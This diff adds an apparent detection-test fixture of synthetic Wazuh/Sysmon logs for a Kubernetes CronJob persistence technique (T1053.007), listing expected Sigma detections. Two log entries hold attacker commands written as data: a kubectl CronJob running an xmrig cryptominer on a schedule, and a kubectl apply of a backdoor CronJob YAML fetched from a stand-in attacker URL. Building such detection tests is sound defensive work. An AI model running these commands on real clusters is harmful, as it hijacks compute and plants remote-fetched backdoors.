@@ -1,0 +1,144 @@
+{
+  "_metadata": {
+    "attack_id": "T1053.007",
+    "variation": "001",
+    "name": "Container Orchestration Job - Kubernetes CronJob",
+    "description": "Adversary creates a Kubernetes CronJob to execute malicious code on schedule",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "execution",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Linux Sysmon Event 1 - kubectl create cronjob",
+      "sequence": 1,
+      "timestamp": "2026-02-08T14:25:00.000Z",
+      "log": {
+        "timestamp": "2026-02-08T14:25:00.000+0000",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon for Linux - Event 1: Process Create",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1053.007"
+            ],
+            "tactic": [
+              "Execution",
+              "Persistence",
+              "Privilege Escalation"
+            ],
+            "technique": [
+              "Scheduled Task/Job: Container Orchestration Job"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "linux"
+          ]
+        },
+        "agent": {
+          "id": "030",
+          "name": "VULN01",
+          "ip": "198.51.100.30"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707400100.300008",
+        "decoder": {
+          "name": "sysmon-linux"
+        },
+        "location": "/var/log/sysmon/syslog",
+        "data": {
+          "eventdata": {
+            "utcTime": "2026-02-08 14:25:00.000",
+            "processGuid": "{A1B2C3D4-EXEC-1053-0007-000000000001}",
+            "processId": "30124",
+            "image": "/usr/local/bin/kubectl",
+            "commandLine": "kubectl create cronjob crypto-miner --image=xmrig/xmrig --schedule='*/5 * * * *' -- /xmrig -o pool.minexmr.com:4444",
+            "currentDirectory": "/home/attacker",
+            "user": "attacker",
+            "parentProcessGuid": "{A1B2C3D4-EXEC-1053-0007-PARENT000001}",
+            "parentProcessId": "30100",
+            "parentImage": "/bin/bash",
+            "parentCommandLine": "bash"
+          }
+        },
+        "_fomorian_batch": "PT-2026-003-batch2-execution",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1053.007",
+        "_fomorian_expected_detection": "Sigma: Kubernetes CronJob Creation (T1053.007)"
+      }
+    },
+    {
+      "_comment": "Linux Sysmon Event 1 - kubectl apply cronjob from malicious yaml",
+      "sequence": 2,
+      "timestamp": "2026-02-08T14:26:00.000Z",
+      "log": {
+        "timestamp": "2026-02-08T14:26:00.000+0000",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon for Linux - Event 1: Process Create",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1053.007"
+            ],
+            "tactic": [
+              "Execution",
+              "Persistence",
+              "Privilege Escalation"
+            ],
+            "technique": [
+              "Scheduled Task/Job: Container Orchestration Job"
+            ]
+          },
+          "firedtimes": 2,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "linux"
+          ]
+        },
+        "agent": {
+          "id": "030",
+          "name": "VULN01",
+          "ip": "198.51.100.30"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707400100.300009",
+        "decoder": {
+          "name": "sysmon-linux"
+        },
+        "location": "/var/log/sysmon/syslog",
+        "data": {
+          "eventdata": {
+            "utcTime": "2026-02-08 14:26:00.000",
+            "processGuid": "{A1B2C3D4-EXEC-1053-0007-000000000002}",
+            "processId": "30156",
+            "image": "/usr/local/bin/kubectl",
+            "commandLine": "kubectl apply -f https://raw.githubusercontent.com/attacker/malware/main/backdoor-cronjob.yaml",
+            "currentDirectory": "/home/attacker",
+            "user": "attacker",
+            "parentProcessGuid": "{A1B2C3D4-EXEC-1053-0007-PARENT000002}",
+            "parentProcessId": "30100",
+            "parentImage": "/bin/bash",
+            "parentCommandLine": "bash"
+          }
+        },
+        "_fomorian_batch": "PT-2026-003-batch2-execution",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1053.007",
+        "_fomorian_expected_detection": "Sigma: Kubectl Apply from Remote URL (T1053.007)"
+      }
+    }
+  ]
+}
